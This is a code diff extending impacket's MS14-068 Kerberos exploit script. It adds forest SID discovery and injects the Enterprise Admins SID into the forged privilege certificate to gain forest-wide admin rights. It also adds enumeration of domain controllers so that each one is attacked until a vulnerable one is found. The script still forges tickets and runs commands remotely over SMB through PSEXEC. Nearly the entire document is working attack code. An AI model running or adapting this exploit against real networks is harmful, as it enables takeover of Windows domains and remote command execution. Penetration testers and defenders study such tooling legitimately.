@@ -36,12 +36,16 @@ from binascii import unhexlify
 
 from impacket.examples import logger
 from impacket.dcerpc.v5.ndr import NDRSTRUCT, NDRUniConformantArray, NDRPOINTER
-from impacket.dcerpc.v5.dtypes import ULONG, RPC_SID, RPC_UNICODE_STRING, FILETIME, PRPC_SID, USHORT
-from impacket.dcerpc.v5.nrpc import USER_SESSION_KEY, CHAR_FIXED_8_ARRAY, PUCHAR_ARRAY, PRPC_UNICODE_STRING_ARRAY
-from impacket.dcerpc.v5.rpcrt import TypeSerialization1
+from impacket.dcerpc.v5.dtypes import ULONG, RPC_SID, RPC_UNICODE_STRING, FILETIME, PRPC_SID, USHORT, MAXIMUM_ALLOWED
+from impacket.dcerpc.v5.nrpc import USER_SESSION_KEY, CHAR_FIXED_8_ARRAY, PUCHAR_ARRAY, PRPC_UNICODE_STRING_ARRAY, MSRPC_UUID_NRPC, hDsrGetDcNameEx
+from impacket.dcerpc.v5.rpcrt import TypeSerialization1, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+from impacket.dcerpc.v5.lsat import MSRPC_UUID_LSAT, hLsarOpenPolicy2, POLICY_LOOKUP_NAMES
+from impacket.dcerpc.v5.lsad import hLsarQueryInformationPolicy2, POLICY_INFORMATION_CLASS
+from impacket.dcerpc.v5 import epm
+from impacket.dcerpc.v5.drsuapi import MSRPC_UUID_DRSUAPI, hDRSDomainControllerInfo, DRSBind, NTDSAPI_CLIENT_GUID, \
+    DRS_EXTENSIONS_INT, DRS_EXT_GETCHGREQ_V6, DRS_EXT_GETCHGREPLY_V6, DRS_EXT_GETCHGREQ_V8, DRS_EXT_STRONG_ENCRYPTION, \
+    NULLGUID, DRS_EXT_RECYCLE_BIN
 from impacket.structure import Structure
-
-
 
 ################################################################################
 # CONSTANTS
@@ -611,7 +615,7 @@ class MS14_068:
             ('Data', PKERB_VALIDATION_INFO),
         )
 
-    def __init__(self, target, targetIp = None, kdchost = None, username = '', password = '', domain='', hashes = None, command='', copyFile=None, writeTGT=None, kdcHost=None):
+    def __init__(self, target, targetIp = None, username = '', password = '', domain='', hashes = None, command='', copyFile=None, writeTGT=None, kdcHost=None):
         self.__username = username
         self.__password = password
         self.__domain = domain
@@ -625,11 +629,10 @@ class MS14_068:
         self.__command = command
         self.__writeTGT = writeTGT
         self.__domainSid = ''
+        self.__forestSid = None
+        self.__domainControllers = list()
+        self.__kdcHost = kdcHost
 
-        if kdcHost is not None:
-            self.__kdcHost = kdcHost
-        else:
-            self.__kdcHost = domain
         if hashes is not None:
             self.__lmhash, self.__nthash = hashes.split(':')
             self.__lmhash = unhexlify(self.__lmhash)
@@ -721,8 +724,13 @@ class MS14_068:
         # AUTHENTICATION_AUTHORITY_ASSERTED_IDENTITY: A SID that means the client's identity is 
         # asserted by an authentication authority based on proof of possession of client credentials.
         #extraSids = ('S-1-18-1',)
-        extraSids = ()
-        kerbdata['SidCount']          = len(extraSids)
+        if self.__forestSid is not None:
+            extraSids = ('%s-%s' % (self.__forestSid, '519'),)
+            kerbdata['SidCount']          = len(extraSids)
+            kerbdata['UserFlags'] |= 0x20
+        else:
+            extraSids = ()
+            kerbdata['SidCount']          = len(extraSids)
         
         for extraSid in extraSids:
             sidRecord = KERB_SID_AND_ATTRIBUTES()
@@ -738,6 +746,11 @@ class MS14_068:
             
         validationInfo = self.VALIDATION_INFO()
         validationInfo['Data'] = kerbdata
+
+        if logging.getLogger().level == logging.DEBUG:
+            logging.debug('VALIDATION_INFO')
+            validationInfo.dump()
+            print ('\n')
 
         validationInfoBlob = validationInfo.getData()+validationInfo.getDataReferents()
         validationInfoAlignment = '\x00'*(((len(validationInfoBlob)+7)/8*8)-len(validationInfoBlob))
@@ -960,6 +973,90 @@ class MS14_068:
     
         return r, cipher, sessionKey, newSessionKey
 
+    def getForestSid(self):
+        logging.debug('Calling NRPC DsrGetDcNameEx()')
+
+        stringBinding = r'ncacn_np:%s[\pipe\netlogon]' % self.__kdcHost
+
+        rpctransport = transport.DCERPCTransportFactory(stringBinding)
+
+        if hasattr(rpctransport, 'set_credentials'):
+            rpctransport.set_credentials(self.__username,self.__password, self.__domain, self.__lmhash, self.__nthash)
+
+        dce = rpctransport.get_dce_rpc()
+        dce.connect()
+        dce.bind(MSRPC_UUID_NRPC)
+
+        resp = hDsrGetDcNameEx(dce, NULL, NULL, NULL, NULL, 0)
+        forestName = resp['DomainControllerInfo']['DnsForestName'][:-1]
+        logging.debug('DNS Forest name is %s' % forestName)
+        dce.disconnect()
+
+        logging.debug('Calling LSAT hLsarQueryInformationPolicy2()')
+
+        stringBinding = r'ncacn_np:%s[\pipe\lsarpc]' % forestName
+
+        rpctransport = transport.DCERPCTransportFactory(stringBinding)
+
+        if hasattr(rpctransport, 'set_credentials'):
+            rpctransport.set_credentials(self.__username,self.__password, self.__domain, self.__lmhash, self.__nthash)
+
+        dce = rpctransport.get_dce_rpc()
+        dce.connect()
+        dce.bind(MSRPC_UUID_LSAT)
+
+        resp = hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | POLICY_LOOKUP_NAMES)
+        policyHandle = resp['PolicyHandle']
+
+        resp = hLsarQueryInformationPolicy2(dce, policyHandle, POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)
+        dce.disconnect()
+
+        forestSid = resp['PolicyInformation']['PolicyAccountDomainInfo']['DomainSid'].formatCanonical()
+        logging.info("Forest SID: %s"% forestSid)
+
+        return forestSid
+
+    def getDomainControllers(self):
+        logging.debug('Calling DRSDomainControllerInfo()')
+
+        stringBinding = epm.hept_map(self.__domain, MSRPC_UUID_DRSUAPI, protocol = 'ncacn_ip_tcp')
+
+        rpctransport = transport.DCERPCTransportFactory(stringBinding)
+
+        if hasattr(rpctransport, 'set_credentials'):
+            rpctransport.set_credentials(self.__username,self.__password, self.__domain, self.__lmhash, self.__nthash)
+
+        dce = rpctransport.get_dce_rpc()
+        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)
+        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+        dce.connect()
+        dce.bind(MSRPC_UUID_DRSUAPI)
+
+        request = DRSBind()
+        request['puuidClientDsa'] = NTDSAPI_CLIENT_GUID
+        drs = DRS_EXTENSIONS_INT()
+        drs['cb'] = len(drs) #- 4
+        drs['dwFlags'] = DRS_EXT_GETCHGREQ_V6 | DRS_EXT_GETCHGREPLY_V6 | DRS_EXT_GETCHGREQ_V8 | DRS_EXT_STRONG_ENCRYPTION
+        drs['SiteObjGuid'] = NULLGUID
+        drs['Pid'] = 0
+        drs['dwReplEpoch'] = 0
+        drs['dwFlagsExt'] = DRS_EXT_RECYCLE_BIN
+        drs['ConfigObjGUID'] = NULLGUID
+        drs['dwExtCaps'] = 0
+        request['pextClient']['cb'] = len(drs)
+        request['pextClient']['rgb'] = list(str(drs))
+        resp = dce.request(request)
+
+        dcs = hDRSDomainControllerInfo(dce,  resp['phDrs'], self.__domain, 1)
+
+        dce.disconnect()
+        domainControllers = list()
+        for dc in dcs['pmsgOut']['V1']['rItems']:
+            logging.debug('Found domain controller %s' % dc['DnsHostName'][:-1])
+            domainControllers.append(dc['DnsHostName'][:-1])
+
+        return domainControllers
+
     def getUserSID(self):
         stringBinding = r'ncacn_np:%s[\pipe\samr]' % self.__kdcHost
 
@@ -980,108 +1077,138 @@ class MS14_068:
         resp = samr.hSamrLookupNamesInDomain(dce, domainHandle, (self.__username,))
         # Let's pick the relative ID
         rid = resp['RelativeIds']['Element'][0]['Data']
-        logging.info("UserSID: %s-%s"% (domainId.formatCanonical(), rid))
+        logging.info("User SID: %s-%s"% (domainId.formatCanonical(), rid))
         return domainId, rid
 
     def exploit(self):
+        if self.__kdcHost is None:
+            getDCs = True
+            self.__kdcHost = self.__domain
+        else:
+            getDCs = False
+
         self.__domainSid, self.__rid = self.getUserSID()
+        try:
+            self.__forestSid = self.getForestSid()
+        except Exception, e:
+            # For some reason we couldn't get the forest data. No problem, we can still continue
+            # Only drawback is we won't get forest admin if successful
+            logging.error('Couldn\'t get forest info (%s), continuing' % str(e))
+            self.__forestSid = None
+
+        if getDCs is False:
+            # User specified a DC already, no need to get the list
+            self.__domainControllers.append(self.__kdcHost)
+        else:
+            self.__domainControllers = self.getDomainControllers()
 
         userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-        while True: 
-            try:
-                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain, self.__lmhash, self.__nthash, None, self.__kdcHost, requestPAC=False)
-            except KerberosError, e:
-                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
-                    # We might face this if the target does not support AES (most probably
-                    # Windows XP). So, if that's the case we'll force using RC4 by converting
-                    # the password to lm/nt hashes and hope for the best. If that's already
-                    # done, byebye.
-                    if self.__lmhash is '' and self.__nthash is '':
-                        from impacket.ntlm import compute_lmhash, compute_nthash
-                        self.__lmhash = compute_lmhash(self.__password) 
-                        self.__nthash = compute_nthash(self.__password) 
-                        continue
+        for dc in self.__domainControllers:
+            logging.info('Attacking domain controller %s' % dc)
+            self.__kdcHost = dc
+            exception = None
+            while True:
+                try:
+                    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain, self.__lmhash, self.__nthash, None, self.__kdcHost, requestPAC=False)
+                except KerberosError, e:
+                    if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
+                        # We might face this if the target does not support AES (most probably
+                        # Windows XP). So, if that's the case we'll force using RC4 by converting
+                        # the password to lm/nt hashes and hope for the best. If that's already
+                        # done, byebye.
+                        if self.__lmhash is '' and self.__nthash is '':
+                            from impacket.ntlm import compute_lmhash, compute_nthash
+                            self.__lmhash = compute_lmhash(self.__password)
+                            self.__nthash = compute_nthash(self.__password)
+                            continue
+                        else:
+                            exception = str(e)
+                            break
                     else:
-                        raise 
+                        exception = str(e)
+                        break
+
+                # So, we have the TGT, now extract the new session key and finish
+                asRep = decoder.decode(tgt, asn1Spec = AS_REP())[0]
+
+                # If the cypher in use != RC4 there's gotta be a salt for us to use
+                salt = ''
+                if asRep['padata']:
+                    for pa in asRep['padata']:
+                        if pa['padata-type'] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
+                            etype2 = decoder.decode(str(pa['padata-value'])[2:], asn1Spec = ETYPE_INFO2_ENTRY())[0]
+                            salt = str(etype2['salt'])
+
+                cipherText = asRep['enc-part']['cipher']
+
+                # Key Usage 3
+                # AS-REP encrypted part (includes TGS session key or
+                # application session key), encrypted with the client key
+                # (Section 5.4.2)
+                if self.__nthash != '':
+                    key = Key(cipher.enctype,self.__nthash)
                 else:
-                    raise 
+                    key = cipher.string_to_key(self.__password, salt, None)
 
-            # So, we have the TGT, now extract the new session key and finish
-            asRep = decoder.decode(tgt, asn1Spec = AS_REP())[0]
+                plainText = cipher.decrypt(key, 3, str(cipherText))
+                encASRepPart = decoder.decode(plainText, asn1Spec = EncASRepPart())[0]
+                authTime = encASRepPart['authtime']
 
-            # If the cypher in use != RC4 there's gotta be a salt for us to use
-            salt = ''
-            if asRep['padata']:
-                for pa in asRep['padata']:
-                    if pa['padata-type'] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
-                        etype2 = decoder.decode(str(pa['padata-value'])[2:], asn1Spec = ETYPE_INFO2_ENTRY())[0]
-                        salt = str(etype2['salt'])
+                serverName = Principal('krbtgt/%s' % self.__domain.upper(), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+                tgs, cipher, oldSessionKey, sessionKey = self.getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey, authTime)
 
-            cipherText = asRep['enc-part']['cipher']
-
-            # Key Usage 3
-            # AS-REP encrypted part (includes TGS session key or
-            # application session key), encrypted with the client key
-            # (Section 5.4.2)
-            if self.__nthash != '':
-                key = Key(cipher.enctype,self.__nthash)
-            else:
-                key = cipher.string_to_key(self.__password, salt, None)
-
-            plainText = cipher.decrypt(key, 3, str(cipherText))
-            encASRepPart = decoder.decode(plainText, asn1Spec = EncASRepPart())[0]
-            authTime = encASRepPart['authtime']
-
-            serverName = Principal('krbtgt/%s' % self.__domain.upper(), type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-            tgs, cipher, oldSessionKey, sessionKey = self.getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey, authTime)
-
-            # We've done what we wanted, now let's call the regular getKerberosTGS to get a new ticket for cifs
-            serverName = Principal('cifs/%s' % self.__target, type=constants.PrincipalNameType.NT_SRV_INST.value)
-            try:
-                tgsCIFS, cipher, oldSessionKeyCIFS, sessionKeyCIFS = getKerberosTGS(serverName, domain, self.__kdcHost, tgs, cipher, sessionKey)
-            except KerberosError, e:
-                if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
-                    # We might face this if the target does not support AES (most probably
-                    # Windows XP). So, if that's the case we'll force using RC4 by converting
-                    # the password to lm/nt hashes and hope for the best. If that's already
-                    # done, byebye.
-                    if self.__lmhash is '' and self.__nthash is '':
-                        from impacket.ntlm import compute_lmhash, compute_nthash
-                        self.__lmhash = compute_lmhash(self.__password) 
-                        self.__nthash = compute_nthash(self.__password) 
+                # We've done what we wanted, now let's call the regular getKerberosTGS to get a new ticket for cifs
+                serverName = Principal('cifs/%s' % self.__target, type=constants.PrincipalNameType.NT_SRV_INST.value)
+                try:
+                    tgsCIFS, cipher, oldSessionKeyCIFS, sessionKeyCIFS = getKerberosTGS(serverName, domain, self.__kdcHost, tgs, cipher, sessionKey)
+                except KerberosError, e:
+                    if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
+                        # We might face this if the target does not support AES (most probably
+                        # Windows XP). So, if that's the case we'll force using RC4 by converting
+                        # the password to lm/nt hashes and hope for the best. If that's already
+                        # done, byebye.
+                        if self.__lmhash is '' and self.__nthash is '':
+                            from impacket.ntlm import compute_lmhash, compute_nthash
+                            self.__lmhash = compute_lmhash(self.__password)
+                            self.__nthash = compute_nthash(self.__password)
+                        else:
+                            exception = str(e)
+                            break
                     else:
-                        raise 
+                        exception = str(e)
+                        break
                 else:
-                    raise 
-            else:
-                # Everything went well, let's save the ticket if asked and leave
-                if self.__writeTGT is not None:
-                    from impacket.krb5.ccache import CCache
-                    ccache = CCache()
-                    ccache.fromTGS(tgs, oldSessionKey, sessionKey)
-                    ccache.saveFile(self.__writeTGT)
+                    # Everything went well, let's save the ticket if asked and leave
+                    if self.__writeTGT is not None:
+                        from impacket.krb5.ccache import CCache
+                        ccache = CCache()
+                        ccache.fromTGS(tgs, oldSessionKey, sessionKey)
+                        ccache.saveFile(self.__writeTGT)
+                    break
+            if exception is None:
+                # Success!
+                logging.info('%s found vulnerable!' % dc)
                 break
-                 
-        TGS = {}
-        TGS['KDC_REP'] = tgsCIFS
-        TGS['cipher'] = cipher
-        TGS['oldSessionKey'] = oldSessionKeyCIFS
-        TGS['sessionKey'] = sessionKeyCIFS
+            else:
+                logging.info('%s seems not vulnerable (%s)' % (dc, exception))
 
-        from impacket.smbconnection import SMBConnection
-        if self.__targetIp is None:
-            s = SMBConnection('*SMBSERVER', self.__target)
-        else:
-            s = SMBConnection('*SMBSERVER', self.__targetIp)
-        s.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, TGS=TGS, useCache=False)
+        if exception is None:
+            TGS = {}
+            TGS['KDC_REP'] = tgsCIFS
+            TGS['cipher'] = cipher
+            TGS['oldSessionKey'] = oldSessionKeyCIFS
+            TGS['sessionKey'] = sessionKeyCIFS
 
-        if self.__command != 'None':
-            executer = PSEXEC(self.__command, username, domain, s, TGS, self.__copyFile)
-            executer.run(self.__target)
-        #s.connectTree('C$')
-        #print s.listPath('C$','/*')
+            from impacket.smbconnection import SMBConnection
+            if self.__targetIp is None:
+                s = SMBConnection('*SMBSERVER', self.__target)
+            else:
+                s = SMBConnection('*SMBSERVER', self.__targetIp)
+            s.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, TGS=TGS, useCache=False)
 
-        pass
+            if self.__command != 'None':
+                executer = PSEXEC(self.__command, username, domain, s, TGS, self.__copyFile)
+                executer.run(self.__target)
 
 if __name__ == '__main__':
     # Init the example's logger theme
@@ -1117,6 +1244,7 @@ if __name__ == '__main__':
     parser = argparse.ArgumentParser(add_help = True, description = "MS14-068 Exploit. It establishes a SMBConnection and PSEXEcs the target or saves the TGT for later use.")
 
     parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName>')
+    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
     parser.add_argument('command', nargs='*', default = ' ', help='command (or arguments if -c is used) to execute at the target (w/o path). Defaults to cmd.exe. \'None\' will not execute PSEXEC (handy if you just want to save the ticket)')
     parser.add_argument('-c', action='store',metavar = "pathname",  help='uploads the filename for later execution, arguments are passed in the command option')
     parser.add_argument('-w', action='store',metavar = "pathname",  help='writes the golden ticket in CCache format into the <pathname> file')
@@ -1148,6 +1276,11 @@ if __name__ == '__main__':
         logging.critical('Domain should be specified!')
         sys.exit(1)
 
+    if options.debug is True:
+        logging.getLogger().setLevel(logging.DEBUG)
+    else:
+        logging.getLogger().setLevel(logging.INFO)
+
     if password == '' and username != '' and options.hashes is None:
         from getpass import getpass
         password = getpass("Password:")
@@ -1156,7 +1289,7 @@ if __name__ == '__main__':
     if commands == ' ':
         commands = 'cmd.exe'
 
-    dumper = MS14_068(address, options.target_ip, None, username, password, domain, options.hashes, commands, options.c, options.w, options.dc_ip)
+    dumper = MS14_068(address, options.target_ip, username, password, domain, options.hashes, commands, options.c, options.w, options.dc_ip)
 
     try:
         dumper.exploit()
